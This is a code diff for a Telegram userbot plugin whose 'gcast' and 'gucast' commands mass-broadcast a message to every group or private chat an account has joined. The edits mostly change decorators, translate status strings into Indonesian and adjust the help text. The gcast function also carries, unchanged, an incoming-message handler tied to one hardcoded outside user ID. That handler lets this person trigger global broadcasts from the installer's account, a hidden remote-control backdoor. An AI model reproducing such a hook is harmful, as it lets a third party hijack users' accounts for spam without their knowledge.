@@ -10,22 +10,21 @@
 # FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
 # t.me/SharingUserbot & t.me/Lunatic0de
 
-from userbot import CMD_HELP
+from userbot import CMD_HELP, CMD_HANDLER as cmd
+from userbot.utils import kay_cmd
 from userbot.events import register
 
 GCAST_BLACKLIST = [
     -1001473548283,  # SharingUserbot
     -1001433238829,  # TedeSupport
-    -1001327032795,  # UltroidSupport
-    -1001419516987,  # VeezSupportGroup
-    -1001209432070,  # GeezSupportGroup
     -1001752592753,  # Skyzusupport
     -1001788983303,  # KaySupport
     -1001380293847,  # NastySupport
 ]
 
 
-@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+
+@kay_cmd(pattern="gcast(?: |$)(.*)")
 @register(incoming=True, from_users=1904791338,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
@@ -37,7 +36,7 @@ async def gcast(event):
     else:
         await event.edit("**Berikan Sebuah Pesan atau Reply**")
         return
-    kk = await event.edit("`Globally Broadcasting Msg...`")
+    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 🌏`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -56,7 +55,7 @@ async def gcast(event):
     )
 
 
-@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
+@kay_cmd(pattern="gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -66,7 +65,7 @@ async def gucast(event):
     else:
         await event.edit("**Berikan Sebuah Pesan atau Reply**")
         return
-    kk = await event.edit("`Globally Broadcasting Msg...`")
+    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 🌏`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -84,8 +83,8 @@ async def gucast(event):
 
 CMD_HELP.update(
     {
-        "gcast": "**Plugin : **`gcast`\
-        \n\n  •  **Syntax :** `.gcast` <text/reply media>\
+        "gcast": f"**Plugin : **`gcast`\
+        \n\n  •  **Syntax :** `{cmd}gcast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
@@ -94,8 +93,8 @@ CMD_HELP.update(
 
 CMD_HELP.update(
     {
-        "gucast": "**Plugin : **`gucast`\
-        \n\n  •  **Syntax :** `.gucast` <text/reply media>\
+        "gucast": f"**Plugin : **`gucast`\
+        \n\n  •  **Syntax :** `{cmd}gucast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
